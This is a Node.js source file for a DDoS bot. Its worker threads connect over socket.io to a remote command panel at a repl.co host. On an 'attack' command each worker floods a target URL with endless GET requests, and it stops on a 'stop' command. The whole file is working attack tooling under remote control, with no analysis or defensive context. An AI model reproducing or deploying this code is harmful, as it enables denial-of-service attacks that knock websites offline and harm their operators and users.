const {
    Worker,
    isMainThread
} = require('worker_threads');
const io = require("socket.io-client");
const express = require('express')
const app = express()
app.get("/", (req, res) => {
    res.end('e')
})
app.listen(80)
if (isMainThread) {
    for (i = 0; i < require('os').cpus().length / 1.5; i++) {
        new Worker(__filename);
    }
} else {
    const axios = require('axios');
    var url = ''
    var stop = false
    const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
        reconnectionDelayMax: 10000,
    });
    socket.on("connect", () => {
        console.log(socket.id); // "G5p5..."
    });
    socket.on("disconnect", () => {
        console.log('disconnected')
        setTimeout(() => {
            socket.connect()
        }, 1000)
    });
    socket.on('attack', async m => {
        console.log(m)
        stop = false
        var args = m.split('*')
        url = args[0]
        console.log(parseInt(args[1]))
        for (i = 0; i < parseInt(args[1]); i++) {
            start();
            start();
        }
    })
    socket.on('stop', () => {
        console.log('stopping')
        stop = true
    })
    var e = 1;
    var f = 1;

    function start() {
        if (stop) {
            console.log('stopped')
            return
        }
        console.log('k')
        axios
            .request({
                url,
                method: 'GET'
            })
            .then(r => {
                console.log('sent ' + e + ' requests to', url);
                e++;
                start()
            })
            .catch(e => {
                console.log(f, 'failed requests lol');
                f++;
                start()
            });
    }


}
